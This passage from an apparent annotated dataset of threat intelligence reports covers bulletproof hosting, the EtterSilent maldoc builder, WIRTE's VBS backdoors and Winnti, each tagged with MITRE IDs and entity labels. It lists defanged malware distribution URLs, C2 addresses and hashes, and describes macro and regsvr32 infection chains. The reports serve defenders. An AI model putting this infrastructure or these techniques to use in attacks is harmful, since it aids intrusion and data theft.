cybercriminal\u2019s full operation, it would be vastly more difficult to pull off without the ability to host malware and be free from impunity.\nBanking Trojans\n---------------\nOne of the most common malware families on the internet, banking trojans have been around as long as bulletproof hosting.\nThat\u2019s not a coincidence; if criminals were ever going to succeed with their schemes, they would need a safe harbor to host their criminal wares.\nWhile both bulletproof hosting and banking trojans have evolved, they\u2019ve been linked together for nearly 15 years.\nSome of the most popular banking trojans that take advantage of bulletproof hosting are:\n* **Silent Night/ZLoader:** One of the most ubiquitous banking trojans currently in existence, actors are using bulletproof hosting in conjunction with ZLoader.\nIntel 471 has observed a Russian-speaking actor leverage bulletproof hosting for a website that is linked in a Microsoft Excel spreadsheet sent to phishing targets.\nOnce visited, the website drops ZLoader on a victim\u2019s machine.\nThis particular website is known to be among the IP addresses used by [Yalishanda](https://krebsonsecurity.com/tag/yalishanda/)\u2019s fast-flux proxy service.\nYalishanda is one of the most prolific BPH service providers in the world.\n* **DanaBot**: This banking trojan is the work of a fluent Russian-speaking actor that works with several other persons to offer a malware-as-a-service (MaaS) platform.\nIn 2018, the author stated on an underground forum that he relied on bulletproof hoster IronHost for the trojan\u2019s command-and-control infrastructure.\nIronHost, a now defunct brand that has operated under many different fronts, is thought to be linked to a long-standing BPH service based in Moldova that has changed names numerous times since 2008.\nIt currently operates as Perfect Quality Hosting or PQ Hosting.\nAdditionally, Intel 471 found DanaBot samples in 2019 that were hosted on infrastructure belonging to a different, well-known bulletproof hosting provider.\n* **GozNym:** Known as more of a hybrid, GozNym was two separate malicious programs modified and merged together: a malware downloader (Nymaim) and a banking trojan variant (Gozi ISFB).\nThe crew behind GozNym were known to leverage a very popular fast-flux hosting botnet called Avalanche until the malicious hosting service was brought down by [law enforcement](https://www.wired.com/2016/12/took-4-years-take-avalanche-huge-online-crime-ring/) in late 2016.\nThe GozNym cybercrime network itself would later be dismantled by international law enforcement [in late 2019](https://www.justice.gov/opa/pr/goznym-cyber-criminal-network-operating-out-europe-targeting-american-entities-dismantled).\nInformation Stealers\n--------------------\nWhile, in a sense, all banking trojans are information stealers, not all information stealers are banking trojans.\nCybercriminals have found ways to make money off information that isn\u2019t directly tied to banking services, due partly to BPH infrastructure that allows it to proliferate.\nSome of the info stealers that have been powered by BPH are:\n* **AZORult:** A notorious information stealer, its main function to steal credentials from victim machines and download or execute additional payloads.\nIn use since 2016, the malware\u2019s author claimed in 2019 that there were over 100 customers using the malware.\nWhile it\u2019s impossible to track all deployments of AZORult, one of the most prolific BPH hosters on the internet, CCWeb, has hosted web domains that have sent users the malware.\nCCWeb is currently the only bot-based, double-flux hosting botnet offered in the underground marketplace.\n* **VIDAR:** An information stealer which was advertised for sale on various forums in October 2018, its primary functionality is to steal form data and stored credentials from common software such as email clients, FTP clients and web browsers.\nHosted by the developers, VIDAR has deviated from other BPH models, buying inexpensive virtual private servers (VPS) until those are shut down by abuse complaints.\nIt is unclear whether the VPS hosted the real VIDAR control server code or served as a proxy.\nThis was done after the malware\u2019s author got into a dispute with Yalishanda, who hosted it for 18 months.\n* **Baldr:** An information stealer that had a short-but-popular run, the Russian-linked malware developer would offer discounts to those who bought his product and hosted it on BraZZZerS, a well-known BPH provider.\nBy mid-2019, the developer had stopped issuing new versions, but told current customers they could continue to use the product at their own wishes.\nRansomware\n----------\nCurrently the most pervasive form of cybercrime, ransomware operations would not be possible without a helping hand from BPH providers.\nThere are many ways bulletproof hosting helps criminals fine-tune their criminal enterprise.\nHere are some of the ways bad actors take advantage of BPH:\n* **DarkSide:** One of the newest ransomware gangs in the cybercriminal underground, the author relies on a ransomware-as-a-service (RaaS) model in order to make as much money as possible.\nOne actor that has claimed to be the malware\u2019s operator uses a custom PowerShell script that could exfiltrate data about a compromised system and run commands from a remote command and control (C2) server.\nThe website used to drop that script is hosted in an IP range that has been used by two prominent BPH providers, MoreneHost and Yalishanda.\n* **NEMTY/NEFILIM:** Between March and April 2020, Intel 471 discovered that an affiliate of the NEMTY ransomware service was running a blog used to disclose victim data.\nThat blog was run on BraZZZerS until the operators closed down the ransomware for good.\nIn May, when the NEFILIM ransomware variant was used, a new blog was launched, albeit hosted by a different BPH service.\n* **Maze:** Much like NEMTY/NEFILIM, operators of Maze ran a blog that publicly announced victims.\nThat blog was hosted on a backend netblock associated with the front company of Yalishanda.\nThe blog stopped operating once the Maze gang moved onto an updated version, known as Egregor.\nThis list is just scratching the surface when it comes to bulletproof hosting\u2019s relationship with the cybercrime underground.\nBPH providers also can be tied to the following: carding shops, virtual credit card skimmers, phishing sites, DDoS attacks and spam campaigns, among others.\nBut by gaining stronger familiarity with the most popular services used by cybercriminals, and monitoring for significant activity stemming from their infrastructure, security practitioners can better formulate a proactive plan to guard against these crimes and law enforcement can better hone attempts to permanently take the machines offline.", "mitre_ids": ["T1566", "T1189", "TA0011", "TA0011", "TA0011", "TA0010", "TA0006", "T1105", "TA0009", "TA0011", "TA0010", "T1486", "T1486", "T1486", "T1059", "TA0011", "TA0011", "T1059", "T1189", "T1486", "T1486", "T1486", "S0449", "S0449", "S0449", "S0554", "T1499"], "anno_name_label": [["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"], ["MALWARE", "GozNym"], ["MALWARE", "GozNym"], ["MALWARE", "Gozi ISBF"], ["MALWARE", "GozNym"], ["MALWARE", "GozNym"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Vidar"], ["MALWARE", "Baldr"], ["GROUP", "DarkSide"]], "cti_entity_class": ["CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "EtterSilent: the underground\u2019s new favorite maldoc builder\nApr 07, 2021\nThe cybercrime underground often mimics behaviors that we see in everyday facets of life.\nIntel 471\u2019s latest discovery is an example of one of these patterns: when a product takes off in the marketplace, users will rush to obtain it and find unique ways to use it in order to fit their needs.\nThe latest \u201cproduct\u201d is a malicious document builder, known in the underground as \u201cEtterSilent,\u201d that Intel 471 has seen leveraged by various cybercrime groups.\nAs it has grown in popularity, it has constantly been updated in order to avoid detection.\nUsed in conjunction with other forms of malware, it\u2019s a prime example of how ease of use and a concentration of skill sets leads to a commoditization of the cybercrime economy.\n### How it works\nFirst advertised on a well-known Russian cybercrime forum, the seller offered two types of weaponized Microsoft Office documents (maldocs) to users: one that exploits a known vulnerability in Microsoft Office ([CVE-2017-8570](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2017-8570)) and another that uses a malicious macro.\nTo our knowledge, the maldoc with the macro is the more popular choice, possibly due to lower pricing and higher compatibility when compared to the exploit.\nThe malicious document, when opened, shows a template that poses as DocuSign, the popular software that allows individuals and organizations to electronically sign documents.\nThe maldoc then leverages Excel 4.0 macros stored in a hidden sheet, which allow an externally-hosted payload to be downloaded, written to disk and executed using regsvr32 or rundll32.\nFrom there, attackers can follow up and drop other assorted malware.\n![](https://d39ec1uo9ktrut.cloudfront.net/Screen-Shot-2021-04-01-at-8.54.55-AM.png)\nEtterSilent DocuSign template from December 2020\n![](https://d39ec1uo9ktrut.cloudfront.net/1Screen-Shot-2021-04-01-at-8.54.48-AM.png)\nEtterSilent DocuSign template from March 2021### A cybercrime extravaganza\nEttersilent is being used in many malware campaigns, many of which will be familiar to most cybersecurity experts.\nIt was used in a recent spam campaign to drop an updated version of Trickbot.\nThe maldoc was attached in an email that pretended to be from a well-known multinational appliance manufacturer, claiming to be a payment invoice.\nOn March 19, 2021, EtterSilent was used as part of a Bazar loader campaign.\nThe analyzed maldoc did not use a DocuSign template, but the main Excel sheet was named \u201cDocuSign\u00ae.\nThe maldoc downloads the Bazar payload, which in turn connects to another URL that downloads the related Bazar backdoor.\n### Everyone needs hosting\nThree banking trojans \u2014 BokBot, Gozi ISFB and QBot \u2014have also used EtterSilent in conjunction with their schemes.\nHowever, what makes these campaigns stand out is their reliance on bulletproof hosting, which is needed to stand up their schemes.\nAll three campaigns use services run by Yalishanda, one of the world\u2019s most notorious BPH providers.\nIntel 471 tracked a particular campaign tied to BokBot that had numerous distribution URLs embedded in the EtterSilent maldocs.\nAs of the time this blog was published, all of those domains resolved to one particular IP address.\nThat address is tied to bulletproof infrastructure provided by Yalishanda.\nThe usage of Yalishanda\u2019s BPH service specifically for the delivery URL is reminiscent of years worth of Hancitor campaigns observed by Intel 471.\nWe have written extensively how bulletproof hosting works [hand-in-glove](https://intel471.com/blog/bulletproof-hosting-yalishanda-ransomware-banking-trojans-information-stealers/) with cybercrime for decades, supplying criminals with the infrastructure they need to carry out their crimes.\nEtterSilent\u2019s attachment to [Yalishanda](https://intel471.com/blog/top-bulletproof-hosting-providers-yalishanda-ccweb-brazzzers-2021/) is another example of that notion.\n### A piece in a bigger puzzle\nThe widespread use of EtterSilent shows how commoditization is a big part of the cybercrime economy.\nDifferent players specialize in their respective area, whether that be robust hosting, spam infrastructure, maldoc builders, or malware as a service, and find ways to leverage each other\u2019s products in services by working together.\nA better understanding of not only the malware being used, but how the cybercrime economy works and who the major players are, helps defenders focus on the threats most relevant to our organizations.\n### Appendix 1 - Indicators of compromise\n| **Description** | **Value** |\n| Trickbot payload | 9118198afca6e2479fdbcca55a08a4408570d2186a7dd8f261f1821178deb595 |\n| Trickbot distribution URL | http://costacars[.]es/ico/ortodox.php |\n| EtterSilent maldoc | 50fd4b2e51908a55f2c891fb3ffde2c3661e4324c1887e65fabfb1a93a41efb2 |\n| IcedID payload | 8e51ccc6c8d14f0365d2d597c8aaf6015238839c0dab90e419107782bf460414 |\n| IcedID distribution URL | http://188[.]127.254.114/44270.7082388889.dat |\n| EtterSilent maldoc | 2baf563da8db9e2ed765fa7697025d277d06ee53424f6513671f2f6b7441387b |\n| QBot payload | 24753d9f0d691b6d582da3e301b98f75abbdb5382bb871ee00713c5029c56d44 |\n| Qbot distribution URL | |\n| EtterSilent maldoc | 16a0c2f741a14c423b7abe293e26f711fdb984fc52064982d874bf310c520b12 |\n| Ursnif payload | d5b05a81f377c33a2fba292002d0474b68483225aa09c97a00336fc368383d6a |\n| Ursnif distribution URL | |\n| EtterSilent maldoc | 267a54f074b688d591d5cfb7831f1adb443ec1441076775cb158bed0d385f712 |\n| Bazar payload | b7ce29ffbdf00771b539b28ce01d57cd5805ca3a6ca2eb1b694eed4466912286 |\n| Bazar distribution URL | http://itelsys[.]ma/prod/education.php |\n| EtterSilent maldoc | 5f8e3b19cd4d25ac396cf64f6f448d88e301cf899142bdb03a28cec42eb71389 |\n| Qbot payload | 6a984d3aaffeeec32f3803489c71bfd907e2fb74dbc8eeb931c084f11293e1cc |\n| Qbot distribution URL | http://pokojewewladyslawowie[.]pl/orlpzhiy/44270.5684626157.dat |\n| EtterSilent maldoc | 3a5d67bdc42b7a9ebd1137e49a34d82c0ee99343ae32f3367137db19131c2cf4 |\n| Trickbot payload | aa40f9dd1212993f79cc23111de3a8dd5e529dd1a8ca5dceaa30fba53f6f96b4 |\n| Trickbot distribution URL | http://mineiro[.]ch/casrtnoar/count.php |\n| EtterSilent maldoc | 9b1c03b0cca23a94f2d6988c66eb0d246ec2648623765e83dbf20548ac874837 |\n| Ursnif payload | 1c65c1a53f1cf5372bb35b5af5130e966b4bb7e7941cc1460f28628249ce5189 |\n| Ursnif distribution URL | |\n| EtterSilent maldoc | 2a3316b69ec787ca13a3e35697bcfc4a5e37a9a3080434c56fdf17e0593e0a12 |", "mitre_ids": ["T1204", "T1059", "T1203", "T1059", "T1059", "T1204", "T1059", "T1105", "T1218", "S0266", "T1566", "T1566", "S0534", "S0534", "S0534", "T1105", "S0499", "S0266", "S0266", "S0386", "S0386", "S0534", "S0534", "S0266", "S0266", "S0386", "S0386"], "anno_name_label": [["TOOL", "EtterSilent"], ["TOOL", "EtterSilent"], ["TOOL", "EtterSilent"], ["TOOL", "EtterSilent"], ["TOOL", "EtterSilent"], ["TOOL", "EtterSilent"], ["MALWARE", "BokBot"], ["MALWARE", "Gozi ISBF"], ["MALWARE", "QBot"], ["TOOL", "EtterSilent"], ["MALWARE", "BokBot"], ["TOOL", "EtterSilent"], ["TOOL", "EtterSilent"], ["TOOL", "EtterSilent"], ["TOOL", "EtterSilent"], ["TOOL", "EtterSilent"], ["MALWARE", "QBot"], ["MALWARE", "QBot"], ["TOOL", "EtterSilent"], ["TOOL", "EtterSilent"], ["TOOL", "EtterSilent"], ["MALWARE", "QBot"], ["MALWARE", "QBot"], ["TOOL", "EtterSilent"], ["TOOL", "EtterSilent"], ["TOOL", "EtterSilent"]], "cti_entity_class": ["CE", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "WIRTE Group attacking the Middle East\nApril 02, 2019\nThe Intelligence Development Group of [S2 Grupo](https://s2grupo.es/en/home/) has carried out an investigation on an actor from whom LAB52 has not been able to find references or similarities in open sources and who has been identified as **WIRTE**.\nThe DFIR (Digital Forensics and Incident Response) team of S2 Grupo first identified this actor in August 2018 and since then the follow-up has been carried out during the last few months.\nThis group attacks the Middle East and does not use very sophisticated mechanisms, at least in the campaign started in August 2018 which was monitored.\nIt is considered unsophisticated by the fact that the scripts are unobtrusive, communications go unencrypted by HTTP, they use Powershell (increasingly monitored), and so on.\nDespite this apparently unsophisticated modus operandi compared to other actors, they manage to infect their victims and carry out their objectives.\nIn addition, as will be seen during the report, the detection rate of some of the scripts in December 2018 by the main antivirus manufacturers is low, an aspect that must be highlighted.\nWe must be aware that once these scripts are executed, it is when the behavior analysis of many solutions will detect them, but this fact has not been studied by LAB52.\nThis actor in all the artifacts analyzed shows his victims a decoy document in Arabic with different themes.\nDuring the report these documents will be analyzed and who could be the objectives depending on the topic dealt with in the document.\n### Technical analysis\nAs indicated above, during the month of August 2018 S2 Grupo CERT we managed an incident aimed at the diplomacy of different Middle Eastern countries.\nThe attackers used a malware made in Visual Basic Script (VBS) as a tool to control the victim.\nStarting from the study of this VBS from S2 Grupo CERT, the monitoring of this group was started, finding in other sources other artifacts from the same group but with different decoy documents and with different strategies of execution, persistence, and so on.\nS2 Grupo does not have enough information to make any type of attribution or authorship.\nIt is associated that these artifacts are related because they reflect similarities from a technical and temporal point of view and because of the decoy documents used, since sometimes they are identical.\nOne aspect observed during the investigation is that the attackers after running the VBS used it as an Empire post-exploitation framework (<https://github.com/EmpireProject/Empire>).\nA total of five scripts plus the one involved in the incident could be collected.\nBelow we detail the main characteristics of each.\n#### Script 1: 617bbc71e5f0a645cbb8eeb6d4a1ece96ba0860c8ab5deda6a795e6ad244607a\nThis first file can be seen in Virus Total and has a low detection (4/58).\nThe last analysis took place on 12/12/2018.\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img01.png)\nIn this case the file was uploaded from Palestine to Virus Total:\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img02-1.png)\nIn the image you can see that it was uploaded through the web, from PS (Palestine) and also that it was uploaded for the first time on **5 Aug. 2018**.\nNetwork communication occurs over HTTP to the **micorsoft[.]store** domain to TCP/2082 port.\nThis domain since it exists has resolved to the following ip addresses:\n* 104.31.78.17\n* 104.31.79.17\n* 185.86.79.243\nCurrently resolves to a Cloudflare address.\nPort 2082 is one of the ports allowed by Cloudflare for HTTP traffic.\nIt should be noted that the first IP address 185.86.79.243 is geolocated in Ukraine.\nThis IP address has been assigned to different domains, among them the malicious one.\nApparently the attackers changed their IP address and hid behind Cloudflare at some point.\nIn this script this communication information is all in the **RunPld() function**.\nThis function aims to download the powershell code from the command and control server and execute it:\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_cod01.png)\nAnother common function in these scripts is the writeDOC function.\nThis function decodes the decoy document, write it to disk and show it to the victim.\nThis document is encoded in base64 and embedded in the script itself in a variable.\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_cod02.png)\nThe VBS script copies itself to APPDATA through the **copyVBS()** function:\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_cod03.png)\n**The script itself does not establish persistence** in its first execution, so either the attackers deploy it later when they execute powershell or fix it by transporting this script.\nThe script once copied to APPDATA will have the following name: **Update.vbs**.\nOn the other hand, if the script is running from APPDATA it does not show the document and only executes the RunPld() function which is the backdoor in powershell and that has been detailed previously.\nIf it is not being executed from APPDATA it shows the DOC file \u201cdecoy\u201d, it copies and executes the backdoor (script in powershell).\nWhen the victim executes the VBS file, a Word document will be opened with the following content (you can see on the left in Arabic and next to it the translation made by Google Translate):\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_en_img01.png)\nThe document we have shown is intended to simulate that it was sent from the Ministry of Foreign Affairs of Saudi Arabia.\nPresumably, it seems that the addressee was the Ministry of Awqaf and Islamic Affairs of Kuwait, since (Kuwait \u2013 Jeddah) appears in the very signature of the document.\nIt was also apparently addressed to the Kuwaiti Consulate of the Cooperation Council of the Arab States of the Gulf, a highly important body within the countries of the Persian Gulf.\nThe text mentions that attached, the recipient will find a document from the Saudi Ministry of Foreign Affairs called \u201cHajj affairs\u201d, which is of interest to all those Arab countries that have citizens who have interests in carrying out the pilgrimage to the Mecca.\nIn addition, it encourages recipients to forward the document to other government organizations in countries with interests linked to the \u201cHajj\u201d that have been approved by the same Ministry of Culture of Saudi Arabia.\nPresumably, the author intends to generate an infection among the \u201cpartner states\u201d of Saudi Arabia; **the \u201ctarget\u201d of the issuer could be the members of the diplomatic corps of countries with interest in the \u201cHajj\u201d** and especially the diplomats who are part of the Cooperation Council of the Arab States of the Gulf, since the issuer promotes the forwarding of the document to all interested parties.\nThere are five fundamental pillars within the religion of Islam.\nOne of them is the \u201cHajj\u201d, which implies that all Muslims must visit Mecca at least once in their lifetime.\nThis monument is located in the Jeddah region within Saudi Arabia.\n**The \u201cHajj\u201d is significantly relevant to Muslims around the world**.\nConsequently, this text is attractive and of interest to both Shi\u2019ite and Sunni Muslims.\n**The date of issuance of the document is relevant** as it was held in August, approximately two weeks before the great pilgrimage, just when thousands of people of Muslim faith would begin the pilgrimage to Jeddah in Saudi Arabia.\nConsequently, the chances of a possible victim opening the document increase significantly.\n#### Script 2: b4c20b56059a6c6762b4c99d04eb9177cb0a4707c58ef575817fb8b702f162aa\nThis file in Virus Total has a low detection, 2/56, and the last analysis took place on 1 Dec. 2018.\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img04.png)\nIn this case the file has been uploaded from Palestine to Virus Total:\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img05.png)\nIn the image you can see that it was uploaded through the web, from PS (Palestine) and also that it has been uploaded for the first time on **08/25/2018**.\nThe network communication in this case is also produced by HTTP to the domain **micorsoft[.]store** to the port tcp/2082.\nIn this case the script has exactly the same code as the hash \u201c617bbc71e5f0a645cbb8eeb6d4a1ece96ba0860c8ab5deda6a795e6ad244607a\u201d.\nThe only thing that varies is the decoy document that we can see below:\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img06.png)\nThe information presented in the document is directly related to security issues and internal political affairs of Palestine.\nThe main actors mentioned in the text are Hamas, Al Fatah and the Palestinian government.\nThe information is an analytical summary of the current political situation in Palestine and even analyzes in geostrategic terms some current aspects.\nIn addition, the document informs about the potential political strategies that the previously mentioned actors could undertake in the future.\nThis type of information is highly relevant for **diplomats with political interests in the geographical area of Gaza and Palestine**.\nConsequently, it might be feasible for the document\u2019s target audience to be diplomats, politicians and professionals from the defense sector.\n#### Script 3: b906f3c19c19e1b20b2d00bfb82b5453d5386d63b4db901ecade0f33dd38326a\nThis file in Virus Total has a low detection, 3/56, and the last analysis took place on 1 Dec. 2018.\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img07.png)\nIn this case the file was uploaded from Sweden to Virus Total:\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img08.png)\nIn the image you can confirm that it has been uploaded by the community, from SE (Sweden) and also that it has been uploaded for the first time on **6 Nov. 2018**.\nThe network communication in this case is also produced by HTTP to the **micorsoft[.]store** domain to the TCP/2082 port.\nIn this case the script has exactly the same code as the previous two; the decoy document is identical to \u201c617bbc71e5f0a645cbb8eeb6d4a1ece96ba0860c8ab5deda6a795e6ad244607a\u201d, varying only from where it was uploaded and the dates regarding the first one.\n#### Script 4: 3d4a9466e9428ccb1cde05336f5366b29c7e5ae454ddaa4aa28c75c504c13d96\nThis file in Virus Total has a low detection, 8/56, and the last analysis took place on 12/12/2018.\nWe can see that this document has a higher detection to the rest, although it is certain that some were not re-analyzed on December 12th.\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img09.png)\nIn this case the file was uploaded from Palestine to Virus Total:\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img10.png)\nIn the image you can see that it was uploaded through the web, from PS (Palestine) and also that it was uploaded for the first time on **08/25/2018**.\nThe upload date matches the hash date \u201cb4c20b56059a6c6762b4c99d04eb9177cb0a4707c58ef575817fb8b702f162aa\u201d.\nThe network communication in this case is produced by HTTP to the domain **office365-update[.]co** to TCP/2082 port.\nThis hash changes the domain and then the structure of the script is different from the others, although it maintains functions and similarities with the rest.\nThe ip addresses to which the domain has resolved are:\n* 104.24.108.64\n* 104.24.109.64\nIn this case, the domain has always resolved to CloudFlare and it has not been observed that it has resolved to another IP address as in the previous case.\nThe main of the script is simple and we are going to review its flow:\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_cod04.png)\nWe are going to see what logic each of the functions has.\nThe first function that we find is **writeTXT()**:\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_cod05.png)\nThe function it does is to save, in a file named sys.txt and in a path set from the script, the content of the fileContent variable that is part of a powershell script.\nIt should be noted that the write-to-file function used is **wirte**File(), which as can be seen has produced a typographical error that has been seen in several of the scripts that implement this functionality.\nThe function **writeSCT()**:\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_cod06.png)\nThe function creates an SCT (scriptlet) file on disk to execute through the JScript language a powershell whose code is in the TXT file written by the writeTXT() function.\nRegsvr32.exe is used to trigger the execution:\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_cod07.png)\nThe writeDOC() function performs the same logic as in the hash \u201c617bbc71e5f0a645cbb8eeb6d4a1ece96ba0860c8ab5deda6a795e6ad244607a\u201d and which has already been explained.\nIn this case the decoy document shown to the victim is the same as that presented in \u201cb4c20b56059a6c6762b4c99d04eb9177cb0a4707c58ef575817fb8b702f162aa\u201d.\n#### Script 5: 4f5d633604b8a3cceb7d582bab640d47e8a5898458c5c2f0e28adcdf01aabf33\nThis file has a higher detection rate than the previous ones: you can see that 20/58 antivirus identify it as harmful.\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img11.png)\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img12.png)\nIn the image you can see that it has been uploaded through API, from the US and also that it has been uploaded for the first time on **2 Sept.2018**.\nThe date of upload is after the artifacts uploaded from Palestine, but close in time.\nIn this case you can see a reference to this script in a tweet (<https://twitter.com/ItsReallyNick/status/1036687952544448512>) by Nick Carr (@ItsReallyNick), where he details all the technical aspects of the script:\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img13.png)\nBy viewing the tweet thread we can see how they indicate that in this case runs a VBScript #Houdini RAT and that the command and control server is hxxp: //149.28.14[.]103:535/ is-ready.\nWhen looking for which domains have resolved to this IP address it is observed that the only one categorized as malware is related to spdns.de and searching for this domain name we come to the analysis <https://gist.github.com/JohnLaTwC/ccdcbeb85649ef9feaae045482d694b9>(from @ JohnLaTwC) that shows how this domain is configured with port 535 and with HTTP requests from RAT Houdini.\nThe domain was resolving to IP addresses until **August 30, 2018**.\nThe fact that in this case the actor uses a Houdini varies from the rest of VBS found, which based their execution on a powershell script that received commands from a remote server and executed them, but even so there are several aspects that lead us to think that it is the same actor:\n* \u2022 There are matching function names: writeTXT, writeDOC, wirteFile (this is a very important indicator since it is the same typographical error).\n* \u2022 Then writeDOC has the same logic and, besides, the decoy document is also in Arabic.\nIn this case the decoy document is different from the previous ones, so everything presupposes that the objective is different:\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img14.png)\nThe document refers to information related to the Security Forces in the territory of northern Gaza involved in defending of the border.\nThe information refers to an accreditation and decoration by Palestinian governmental authorities for their members of the law enforcement and security forces.\nThe target of this malicious document could be **soldiers, police, professionals linked to the Ministry of Defense and members of the diplomatic corps in Gaza**.\nThe current government within the Gaza Strip is Hamas, a party that has a military arm considered by different countries as a terrorist group.\n### Indicators of compromise\n![](https://lab52.es/blog/wp-content/uploads/2019/04/wirte_img15.png)", "mitre_ids": ["G0090", "G0090", "T1071", "T1059", "T1059", "T1204", "T1059", "T1204", "T1059", "T1059", "T1571", "T1571", "T1071", "T1059", "TA0011", "T1105", "T1140", "T1027", "T1059", "T1059", "T1059", "T1059", "T1059", "TA0003", "T1204", "T1571", "T1071", "T1036", "T1571", "T1036", "T1571", "T1059", "T1059", "T1059", "T1218", "T1036", "T1059", "TA0011", "T1071", "T1571", "T1059", "T1059", "TA0011", "T1036", "T1036"], "anno_name_label": [["MALWARE", "Houdini RAT"], ["MALWARE", "Houdini RAT"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CE", "CI", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CI", "CI", "CI"]}, {"cti_report": "Winnti Group: Geostrategic and TTP (Tactics, Techniques and Procedures)\nMay 16, 2019\n**Executive Summary**\n---------------------\nChina is one of the world powers with more presence within the international market of the gaming sector, controlling the Southeast Asian market and even more than half of the global market of the Gaming sector.\nWinnti Group is currently considered to be an APT group allegedly attributed to the government of China ([1]).\nAmong its various targets, it specializes in designing and executing cyber-espionage operations for companies in the Gaming sector in order to collect classified information on Game Design.\n**Geostrategic analysis of China and Winnti Group\u2019s cyber attacks on Thailand\u2019s gaming industry:**\n--------------------------------------------------------------------------------------------------\nThe increase in cyber-attacks within Southeast Asian countries is correlating with the progressive shift in the accumulation of the Gross Domestic Product towards the same area of Southeast Asia.\nThe forecast on the evolution of the global economy can be seen reflected in the estimates of the percentages of GDP (Gross Domestic Product) or GDP (Gross Domestic Product) shown below ([2]):\n![](https://lab52.es/blog/wp-content/uploads/2019/05/Captura-12.png)\n*Illustration 1 The Global Economy\u2019s shifting centre of gravity.*\n![](https://lab52.es/blog/wp-content/uploads/2019/05/Captura-13.png)\n*Illustration 2 Forecast of the center of gravity movement of the global economy*\nAs the percentages on the map show, the evolution of the global distribution of GDP will be concentrated in the countries of Southeast Asia.\nIn this same area, industry and the service sector will increase considerably by 2045.\nInnovations within the IT sector are and will continue to be highly confidential information for those companies and States that maintain an interest in economic control over the Southeast Asian area ([3]).\nThe \u201cgaming\u201d sector has acquired a high relevance within the international market.\nThe countries of Southeast Asia have acquired significant relevance in relation to their design and subsequent production.\n([4]) As can be seen in the following graph, the evolution of the profitability of the global market of the gaming sector has been remarkably beneficial and with a clear forecast of growth:\n![](https://lab52.es/blog/wp-content/uploads/2019/05/Captura-14.png)\n*Illustration 3 The Global Gaming Market*\nWithin the constant growth of the sector, it can be seen that the subsector of the \u201cgaming mobile sector\u201d grows especially faster compared to Gaming PC or the videogames \u201cconsole\u201d.\nThe following graph shows the generation of benefits by global regions:\n![](https://lab52.es/blog/wp-content/uploads/2019/05/Captura-15.png)\n*Illustration 4 Distribution of the gaming market*\nThe group of countries in the Asia-Pacific region has generated up to $71.4 billion, more than half of which has been generated by China ($37 Bn), surpassing the annual profits of the US within the \u201cgaming\u201d sector ([5 ]).\nIn Southeast Asia, China controls 64% of sales related to the \u201cGaming\u201d sector.\nIts main regional competitor is Japan and South Korea.\nSupposedly, the Chinese government, with the intention of maintaining growth and control within the international \u201cgaming\u201d market, has been attributed links with the activity of the APT Winnti Group.\nThis group has as one of its main objectives to collect classified information from the \u201cGame Designers\u201d of the organizations of the gaming sector ([6]).\nThe ESET company has published an investigation about a Winnti Group campaign where the company \u201cThai developer Electronics Extreme\u201d was cyber-attacked and could have distributed infected versions of its product called \u201cInfestation Gameplay\u201d.\nAs the following graph shows, it can be seen that the highest percentage of infected products have been distributed in Thailand.\nThe percentages published by ESET are as follows ([1]):\n![](https://lab52.es/blog/wp-content/uploads/2019/05/Captura-16.png)\n*Illustration 4 Countries most infected by the Winnti Group campaign*\nThe graph above shows a high percentage of cyber-attacks by the Winnti Group against companies in the gaming sector in Thailand ([1]).\nOne of the most unique characteristics of the gaming sector within Thailand is that the companies are not global or large multinationals.\nThe vast majority of companies in Thailand\u2019s gaming sector are SMEs with Thai capital.\nHowever, these same companies usually work with international organizations such as Nintendo or Xbox, among others.\nAnother feature of high value within the gaming market in Thailand are the companies focused on the behavioral study of videogame consumers, such as \u201cAsiasoft\u201d.\nThe Thai gaming industry may be of high interest to a state in terms of cyber espionage, since its collaboration with large international companies and its research on gaming consumers could be of high value to the international gamer industry ([7]).\n**Conclusions**\n---------------\nAs we could realize in this research, almost all the sectors would be a relevant target for a threat group.\nCurrently, the globalized market is able to interconnect all the companies of a specific field.\nThis fact means that, 